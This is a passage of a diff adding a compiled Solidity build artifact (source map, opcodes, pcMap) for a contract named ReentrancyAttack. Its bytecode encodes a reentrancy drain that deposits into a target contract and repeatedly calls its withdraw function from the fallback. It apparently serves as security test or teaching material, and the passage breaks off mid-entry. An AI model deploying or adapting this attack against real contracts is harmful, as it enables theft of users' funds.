+  "deployedSourceMap": "85:765:16:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;473:6;;442:18;;-1:-1:-1;;;;;442:18:16;434:35;:45;430:111;;495:18;;;;523:6;495:35;;;-1:-1:-1;;;495:35:16;;;;;;;;;;-1:-1:-1;;;;;495:18:16;;;;:27;;:35;;;;;;;;;;:18;;:35;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;430:111;85:765;754:94;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;117:36;;;;;;;;;;;;;:::i;:::-;;;;-1:-1:-1;;;;;117:36:16;;;;;;;;;;;;;;553:195;;;:::i;159:32::-;;;;;;;;;;;;;:::i;754:94::-;820:21;754:94;:::o;117:36::-;;;-1:-1:-1;;;;;117:36:16;;:::o;553:195::-;619:11;606:9;:24;;598:33;;;;;;641:18;;;;674:6;641:55;;;-1:-1:-1;;;641:55:16;;690:4;641:55;;;;;;-1:-1:-1;;;;;641:18:16;;;;:25;;:55;;;;;;;;;;674:6;641:18;:55;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;706:18:16;;;;734:6;706:35;;;-1:-1:-1;;;706:35:16;;;;;;;;;;-1:-1:-1;;;;;706:18:16;;;;-1:-1:-1;706:27:16;;-1:-1:-1;706:35:16;;;;;-1:-1:-1;706:35:16;;;;;;:18;;:35;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;553:195::o;159:32::-;;;;:::o",
+  "language": "Solidity",
+  "natspec": {
+    "kind": "dev",
+    "methods": {},
+    "version": 1
+  },
+  "offset": [
+    85,
+    850
+  ],
+  "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x3F JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x12065FE0 EQ PUSH2 0xBA JUMPI DUP1 PUSH4 0x61EC2634 EQ PUSH2 0xE1 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x112 JUMPI DUP1 PUSH4 0xAA8C217C EQ PUSH2 0x11A JUMPI JUMPDEST PUSH1 0x1 SLOAD PUSH1 0x0 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND BALANCE LT PUSH2 0xB8 JUMPI PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x2E1A7D4D PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 DUP2 ADD SWAP3 SWAP1 SWAP3 MSTORE MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND SWAP3 PUSH4 0x2E1A7D4D SWAP3 PUSH1 0x24 DUP1 DUP5 ADD SWAP4 DUP3 SWAP1 SUB ADD DUP2 DUP4 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x9F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xB3 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xC6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xCF PUSH2 0x12F JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP2 DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xED JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xF6 PUSH2 0x133 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0xB8 PUSH2 0x142 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x126 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xCF PUSH2 0x21D JUMP JUMPDEST SELFBALANCE SWAP1 JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH7 0x38D7EA4C68000 CALLVALUE LT ISZERO PUSH2 0x156 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH3 0x362A95 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP4 AND SWAP4 PUSH3 0x362A95 SWAP4 PUSH1 0x24 DUP1 DUP5 ADD SWAP4 DUP3 SWAP1 SUB ADD DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x19E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1B2 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x2E1A7D4D PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 DUP2 ADD SWAP3 SWAP1 SWAP3 MSTORE MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND SWAP6 POP PUSH4 0x2E1A7D4D SWAP5 POP PUSH1 0x24 DUP1 DUP3 ADD SWAP5 POP SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP4 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x203 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x217 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x1 SLOAD DUP2 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 CALLDATASIZE 0x21 0xE3 BLOCKHASH 0xED TIMESTAMP 0x25 SWAP6 0xB3 PUSH20 0x3806B599AFD229D36405FC94F541D6497BB4E7EF 0x1F JUMP PUSH5 0x736F6C6343 STOP MOD 0xC STOP CALLER ",
+  "pcMap": {
+    "0": {
+      "offset": [
+        85,
+        850
+      ],
+      "op": "PUSH1",
+      "path": "16",
+      "value": "0x80"
+    },
+    "2": {
+      "fn": null,
+      "offset": [
+        85,
+        850
+      ],
+      "op": "PUSH1",
+      "path": "16",
+      "value": "0x40"
+    },
+    "4": {
+      "fn": null,
+      "offset": [
+        85,
+        850
+      ],
+      "op": "MSTORE",
+      "path": "16"
+    },
+    "5": {
+      "fn": null,
+      "offset": [
+        85,
+        850
+      ],
+      "op": "PUSH1",
+      "path": "16",
+      "value": "0x4"
+    },
+    "7": {
+      "fn": null,
+      "offset": [
+        85,
+        850
+      ],
+      "op": "CALLDATASIZE",
+      "path": "16"
+    },
+    "8": {
+      "fn": null,
+      "offset": [
+        85,
+        850
+      ],
+      "op": "LT",
+      "path": "16"
+    },
+    "9": {
+      "fn": null,
+      "offset": [
+        85,
+        850
+      ],
+      "op": "PUSH2",
+      "path": "16",
+      "value": "0x3F"
+    },
+    "12": {
+      "fn": null,
+      "offset": [
+        85,
+        850
+      ],
+      "op": "JUMPI",
+      "path": "16"
+    },
+    "13": {
+      "fn": null,
+      "offset": [
+        85,
+        850
+      ],
+      "op": "PUSH1",
+      "path": "16",
+      "value": "0x0"
+    },
+    "15": {
+      "fn": null,
+      "offset": [
+        85,
+        850
+      ],
+      "op": "CALLDATALOAD",
+      "path": "16"
+    },
+    "16": {
+      "fn": null,
+      "offset": [
+        85,
+        850
+      ],
+      "op": "PUSH1",
+      "path": "16",
+      "value": "0xE0"
+    },
+    "18": {
+      "fn": null,
+      "offset": [
+        85,
+        850
+      ],
+      "op": "SHR",
+      "path": "16"
+    },
+    "19": {
+      "fn": null,
+      "offset": [
+        85,
+        850
+      ],
+      "op": "DUP1",
+      "path": "16"
+    },
+    "20": {
+      "fn": null,
+      "offset": [
+        85,
+        850
+      ],
+      "op": "PUSH4",
+      "path": "16",
+      "value": "0x12065FE0"
+    },
+    "25": {
+      "fn": null,
+      "offset": [
+        85,
+        850
+      ],
+      "op": "EQ",
+      "path": "16"
+    },
+    "26": {
+      "fn": null,
+      "offset": [
+        85,
+        850
+      ],
+      "op": "PUSH2",
+      "path": "16",
+      "value": "0xBA"
+    },
+    "29": {
+      "fn": null,
+      "offset": [
+        85,
+        850
+      ],
+      "op": "JUMPI",
+      "path": "16"
+    },
+    "30": {
+      "fn": null,
+      "offset": [
+        85,
+        850
+      ],
+      "op": "DUP1",
+      "path": "16"
+    },
+    "31": {
+      "fn": null,
+      "offset": [
+        85,
+        850
+      ],
+      "op": "PUSH4",
+      "path": "16",
+      "value": "0x61EC2634"
+    },
+    "36": {
+      "fn": null,
+      "offset": [
+        85,
+        850
+      ],
+      "op": "EQ",
+      "path": "16"
+    },
+    "37": {
+      "fn": null,
+      "offset": [
+        85,
+        850
+      ],
+      "op": "PUSH2",
+      "path": "16",
+      "value": "0xE1"
+    },
+    "40": {
+      "fn": null,
+      "offset": [
+        85,
+        850
+      ],
+      "op": "JUMPI",
+      "path": "16"
+    },
+    "41": {
+      "fn": null,
+      "offset": [
+        85,
+        850
+      ],
+      "op": "DUP1",
+      "path": "16"
+    },
+    "42": {
+      "fn": null,
+      "offset": [
+        85,
+        850
+      ],
+      "op": "PUSH4",
+      "path": "16",
+      "value": "0x9E5FAAFC"
+    },
+    "47": {
+      "fn": null,
+      "offset": [
+        85,
+        850
+      ],
+      "op": "EQ",
+      "path": "16"
+    },
+    "48": {
+      "fn": null,
+      "offset": [
+        85,
+        850
+      ],
+      "op": "PUSH2",
+      "path": "16",
+      "value": "0x112"
+    },
+    "51": {
+      "fn": null,
+      "offset": [
+        85,
+        850
+      ],
+      "op": "JUMPI",
+      "path": "16"
+    },
+    "52": {
+      "fn": null,
+      "offset": [
+        85,
+        850
+      ],
+      "op": "DUP1",
+      "path": "16"
+    },
+    "53": {
+      "fn": null,
+      "offset": [
+        85,
+        850
+      ],
+      "op": "PUSH4",
+      "path": "16",
+      "value": "0xAA8C217C"
+    },
+    "58": {
+      "fn": null,
+      "offset": [
+        85,
+        850
+      ],
+      "op": "EQ",
+      "path": "16"
+    },
+    "59": {
+      "fn": null,
+      "offset": [
+        85,
+        850
+      ],
+      "op": "PUSH2",
+      "path": "16",
+      "value": "0x11A"
+    },
+    "62": {
+      "fn": null,
+      "offset": [
+        85,
+        850
+      ],
+      "op": "JUMPI",
+      "path": "16"
+    },
+    "63": {
+      "fn": null,
+      "offset": [
+        85,
+        850
+      ],
+      "op": "JUMPDEST",
+      "path": "16"
+    },
+    "64": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        473,
+        479
+      ],
+      "op": "PUSH1",
+      "path": "16",
+      "value": "0x1"
+    },
+    "66": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        473,
+        479
+      ],
+      "op": "SLOAD",
+      "path": "16"
+    },
+    "67": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        442,
+        460
+      ],
+      "op": "PUSH1",
+      "path": "16",
+      "value": "0x0"
+    },
+    "69": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        442,
+        460
+      ],
+      "op": "SLOAD",
+      "path": "16"
+    },
+    "70": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "72": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "74": {
+      "op": "PUSH1",
+      "value": "0xA0"
+    },
+    "76": {
+      "op": "SHL"
+    },
+    "77": {
+      "op": "SUB"
+    },
+    "78": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        442,
+        460
+      ],
+      "op": "AND",
+      "path": "16"
+    },
+    "79": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        434,
+        469
+      ],
+      "op": "BALANCE",
+      "path": "16"
+    },
+    "80": {
+      "branch": 5,
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        434,
+        479
+      ],
+      "op": "LT",
+      "path": "16"
+    },
+    "81": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        430,
+        541
+      ],
+      "op": "PUSH2",
+      "path": "16",
+      "value": "0xB8"
+    },
+    "84": {
+      "branch": 5,
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        430,
+        541
+      ],
+      "op": "JUMPI",
+      "path": "16"
+    },
+    "85": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        513
+      ],
+      "op": "PUSH1",
+      "path": "16",
+      "statement": 0,
+      "value": "0x0"
+    },
+    "87": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        513
+      ],
+      "op": "DUP1",
+      "path": "16"
+    },
+    "88": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        513
+      ],
+      "op": "SLOAD",
+      "path": "16"
+    },
+    "89": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        513
+      ],
+      "op": "PUSH1",
+      "path": "16",
+      "value": "0x1"
+    },
+    "91": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        523,
+        529
+      ],
+      "op": "SLOAD",
+      "path": "16"
+    },
+    "92": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "PUSH1",
+      "path": "16",
+      "value": "0x40"
+    },
+    "94": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "DUP1",
+      "path": "16"
+    },
+    "95": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "MLOAD",
+      "path": "16"
+    },
+    "96": {
+      "op": "PUSH4",
+      "value": "0x2E1A7D4D"
+    },
+    "101": {
+      "op": "PUSH1",
+      "value": "0xE0"
+    },
+    "103": {
+      "op": "SHL"
+    },
+    "104": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "DUP2",
+      "path": "16"
+    },
+    "105": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "MSTORE",
+      "path": "16"
+    },
+    "106": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "PUSH1",
+      "path": "16",
+      "value": "0x4"
+    },
+    "108": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "DUP2",
+      "path": "16"
+    },
+    "109": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "ADD",
+      "path": "16"
+    },
+    "110": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "SWAP3",
+      "path": "16"
+    },
+    "111": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "SWAP1",
+      "path": "16"
+    },
+    "112": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "SWAP3",
+      "path": "16"
+    },
+    "113": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "MSTORE",
+      "path": "16"
+    },
+    "114": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "MLOAD",
+      "path": "16"
+    },
+    "115": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "117": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "119": {
+      "op": "PUSH1",
+      "value": "0xA0"
+    },
+    "121": {
+      "op": "SHL"
+    },
+    "122": {
+      "op": "SUB"
+    },
+    "123": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        513
+      ],
+      "op": "SWAP1",
+      "path": "16"
+    },
+    "124": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        513
+      ],
+      "op": "SWAP3",
+      "path": "16"
+    },
+    "125": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        513
+      ],
+      "op": "AND",
+      "path": "16"
+    },
+    "126": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        513
+      ],
+      "op": "SWAP3",
+      "path": "16"
+    },
+    "127": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        522
+      ],
+      "op": "PUSH4",
+      "path": "16",
+      "value": "0x2E1A7D4D"
+    },
+    "132": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        522
+      ],
+      "op": "SWAP3",
+      "path": "16"
+    },
+    "133": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "PUSH1",
+      "path": "16",
+      "value": "0x24"
+    },
+    "135": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "DUP1",
+      "path": "16"
+    },
+    "136": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "DUP5",
+      "path": "16"
+    },
+    "137": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "ADD",
+      "path": "16"
+    },
+    "138": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "SWAP4",
+      "path": "16"
+    },
+    "139": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "DUP3",
+      "path": "16"
+    },
+    "140": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "SWAP1",
+      "path": "16"
+    },
+    "141": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "SUB",
+      "path": "16"
+    },
+    "142": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "ADD",
+      "path": "16"
+    },
+    "143": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "DUP2",
+      "path": "16"
+    },
+    "144": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        513
+      ],
+      "op": "DUP4",
+      "path": "16"
+    },
+    "145": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        513
+      ],
+      "op": "DUP8",
+      "path": "16"
+    },
+    "146": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "DUP1",
+      "path": "16"
+    },
+    "147": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "EXTCODESIZE",
+      "path": "16"
+    },
+    "148": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "ISZERO",
+      "path": "16"
+    },
+    "149": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "DUP1",
+      "path": "16"
+    },
+    "150": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "ISZERO",
+      "path": "16"
+    },
+    "151": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "PUSH2",
+      "path": "16",
+      "value": "0x9F"
+    },
+    "154": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "JUMPI",
+      "path": "16"
+    },
+    "155": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "PUSH1",
+      "path": "16",
+      "value": "0x0"
+    },
+    "157": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "DUP1",
+      "path": "16"
+    },
+    "158": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "REVERT",
+      "path": "16"
+    },
+    "159": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "JUMPDEST",
+      "path": "16"
+    },
+    "160": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "POP",
+      "path": "16"
+    },
+    "161": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "GAS",
+      "path": "16"
+    },
+    "162": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "CALL",
+      "path": "16"
+    },
+    "163": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "ISZERO",
+      "path": "16"
+    },
+    "164": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "DUP1",
+      "path": "16"
+    },
+    "165": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "ISZERO",
+      "path": "16"
+    },
+    "166": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "PUSH2",
+      "path": "16",
+      "value": "0xB3"
+    },
+    "169": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "JUMPI",
+      "path": "16"
+    },
+    "170": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "RETURNDATASIZE",
+      "path": "16"
+    },
+    "171": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "PUSH1",
+      "path": "16",
+      "value": "0x0"
+    },
+    "173": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "DUP1",
+      "path": "16"
+    },
+    "174": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "RETURNDATACOPY",
+      "path": "16"
+    },
+    "175": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "RETURNDATASIZE",
+      "path": "16"
+    },
+    "176": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "PUSH1",
+      "path": "16",
+      "value": "0x0"
+    },
+    "178": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "REVERT",
+      "path": "16"
+    },
+    "179": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "JUMPDEST",
+      "path": "16"
+    },
+    "180": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "POP",
+      "path": "16"
+    },
+    "181": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "POP",
+      "path": "16"
+    },
+    "182": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "POP",
+      "path": "16"
+    },
+    "183": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        495,
+        530
+      ],
+      "op": "POP",
+      "path": "16"
+    },
+    "184": {
+      "fn": "ReentrancyAttack.<fallback>",
+      "offset": [
+        430,
+        541
+      ],
+      "op": "JUMPDEST",
+      "path": "16"
+    },
+    "185": {
+      "offset": [
+        85,
+        850
+      ],
+      "op": "STOP",
+      "path": "16"
+    },
+    "186": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        754,
+        848
+      ],
+      "op": "JUMPDEST",
+      "path": "16"
+    },
+    "187": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        754,
+        848
+      ],
+      "op": "CALLVALUE",
+      "path": "16"
+    },
+    "188": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        754,
+        848
+      ],
+      "op": "DUP1",
+      "path": "16"
+    },
+    "189": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        754,
+        848
+      ],
+      "op": "ISZERO",
+      "path": "16"
+    },
+    "190": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        754,
+        848
+      ],
+      "op": "PUSH2",
+      "path": "16",
+      "value": "0xC6"
+    },
+    "193": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        754,
+        848
+      ],
+      "op": "JUMPI",
+      "path": "16"
+    },
+    "194": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        754,
+        848
+      ],
+      "op": "PUSH1",
+      "path": "16",
+      "value": "0x0"
+    },
+    "196": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        754,
+        848
+      ],
+      "op": "DUP1",
+      "path": "16"
+    },
+    "197": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        754,
+        848
+      ],
+      "op": "REVERT",
+      "path": "16"
+    },
+    "198": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        754,
+        848
+      ],
+      "op": "JUMPDEST",
+      "path": "16"
+    },
+    "199": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        754,
+        848
+      ],
+      "op": "POP",
+      "path": "16"
+    },
+    "200": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        754,
+        848
+      ],
+      "op": "PUSH2",
+      "path": "16",
+      "value": "0xCF"
+    },
+    "203": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        754,
+        848
+      ],
+      "op": "PUSH2",
+      "path": "16",
+      "value": "0x12F"
+    },
+    "206": {
+      "fn": "ReentrancyAttack.getBalance",
+      "jump": "i",
+      "offset": [
+        754,
+        848
+      ],
+      "op": "JUMP",
+      "path": "16"
+    },
+    "207": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        754,
+        848
+      ],
+      "op": "JUMPDEST",
+      "path": "16"
+    },
+    "208": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        754,
+        848
+      ],
+      "op": "PUSH1",
+      "path": "16",
+      "value": "0x40"
+    },
+    "210": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        754,
+        848
+      ],
+      "op": "DUP1",
+      "path": "16"
+    },
+    "211": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        754,
+        848
+      ],
+      "op": "MLOAD",
+      "path": "16"
+    },
+    "212": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        754,
+        848
+      ],
+      "op": "SWAP2",
+      "path": "16"
+    },
+    "213": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        754,
+        848
+      ],
+      "op": "DUP3",
+      "path": "16"
+    },
+    "214": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        754,
+        848
+      ],
+      "op": "MSTORE",
+      "path": "16"
+    },
+    "215": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        754,
+        848
+      ],
+      "op": "MLOAD",
+      "path": "16"
+    },
+    "216": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        754,
+        848
+      ],
+      "op": "SWAP1",
+      "path": "16"
+    },
+    "217": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        754,
+        848
+      ],
+      "op": "DUP2",
+      "path": "16"
+    },
+    "218": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        754,
+        848
+      ],
+      "op": "SWAP1",
+      "path": "16"
+    },
+    "219": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        754,
+        848
+      ],
+      "op": "SUB",
+      "path": "16"
+    },
+    "220": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        754,
+        848
+      ],
+      "op": "PUSH1",
+      "path": "16",
+      "value": "0x20"
+    },
+    "222": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        754,
+        848
+      ],
+      "op": "ADD",
+      "path": "16"
+    },
+    "223": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        754,
+        848
+      ],
+      "op": "SWAP1",
+      "path": "16"
+    },
+    "224": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        754,
+        848
+      ],
+      "op": "RETURN",
+      "path": "16"
+    },
+    "225": {
+      "offset": [
+        117,
+        153
+      ],
+      "op": "JUMPDEST",
+      "path": "16"
+    },
+    "226": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        117,
+        153
+      ],
+      "op": "CALLVALUE",
